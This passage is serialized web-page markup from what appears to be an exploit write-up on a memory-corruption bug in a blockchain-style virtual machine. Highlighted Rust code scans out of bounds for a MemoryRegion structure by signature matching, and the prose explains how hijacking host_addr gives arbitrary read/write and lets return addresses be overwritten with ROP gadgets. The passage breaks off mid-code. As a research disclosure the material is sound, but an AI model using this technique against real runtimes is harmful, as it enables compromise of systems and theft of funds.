react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" scan_ptr \"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" leverage_data\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"as_ptr\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"add\"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x2840\"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Start OOB scanning\"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],\"\\n\",[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"loop\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" check_ptr \"]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" scan_ptr \"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],\"    \\n\",[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Signature matching for MemoryRegion array\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"check_ptr \"]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x18\"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement75\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement81\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement83\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement85\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x000000040020a238\"]}],[\"$\",\"span\",\"code-segement86\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement87\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\u0026\"]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[9]}],[\"$\",\"span\",\"code-segement90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"       \"]}],[\"$\",\"span\",\"code-segement91\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement92\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement93\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"check_ptr \"]}],[\"$\",\"span\",\"code-segement95\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement97\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x58\"]}],[\"$\",\"span\",\"code-segement98\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement100\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement104\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement105\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement107\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement108\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}],[\"$\",\"span\",\"code-segement109\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement110\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x0000000400202908\"]}],[\"$\",\"span\",\"code-segement111\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement112\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\u0026\"]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[10]}],[\"$\",\"span\",\"code-segement115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"       \"]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement117\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement118\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement119\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"check_ptr \"]}],[\"$\",\"span\",\"code-segement120\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement121\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement122\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x98\"]}],[\"$\",\"span\",\"code-segement123\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement124\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement125\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement126\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement127\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement128\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement130\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement131\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement132\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement133\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}],[\"$\",\"span\",\"code-segement134\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement135\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x000000040020f308\"]}],[\"$\",\"span\",\"code-segement136\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement137\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\u0026\"]}],[\"$\",\"span\",\"code-segement138\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement140\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"       \"]}],[\"$\",\"span\",\"code-segement141\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement142\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement143\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement144\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"check_ptr \"]}],[\"$\",\"span\",\"code-segement145\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement146\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement147\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0xd8\"]}],[\"$\",\"span\",\"code-segement148\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement149\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement150\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement151\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement152\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement153\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement154\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement155\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement156\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement157\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement158\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}],[\"$\",\"span\",\"code-segement159\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement160\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x0000000400000000\"]}],[\"$\",\"span\",\"code-segement161\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement162\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement163\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[12]}],[\"$\",\"span\",\"code-segement165\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement166\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Bingo!\"]}],[\"$\",\"span\",\"code-segement167\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[13]}],[\"$\",\"span\",\"code-segement169\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement170\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement171\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[14]}],[\"$\",\"span\",\"code-segement173\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement174\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement175\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[15]}],[\"$\",\"span\",\"code-segement177\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement178\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement179\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[16]}],[\"$\",\"span\",\"code-segement181\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement182\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]]]}]}]}],\"\\n\",[\"$\",\"p\",\"p-124\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"We do a really simple signature matching here to locate the \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"POINTER\"}],\" \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\". Since the VM memory layout is fixed, the pointer fields inside \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" for specific indices of input accounts are also fixed, so we can just hardcode these VM layout pointers as our signature.\"]}],\"\\n\",[\"$\",\"h4\",\"h4-16\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":\"Step 6: Arbitrary R/W via MemoryRegion Hijacking\"}],\"\\n\",[\"$\",\"p\",\"p-125\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Once we've successfully hunted down the target \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\", we can overwrite the \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"POINTER\"}],\" account's \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion.host_addr\"}],\" and set its state to writable to achieve arbitrary memory access. For example, we can calculate the thread memory base and hijack return addresses with ROP gadgets.\"]}],\"\\n\",[\"$\",\"pre\",\"pre-20\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" thread_mem \"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x48\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"token 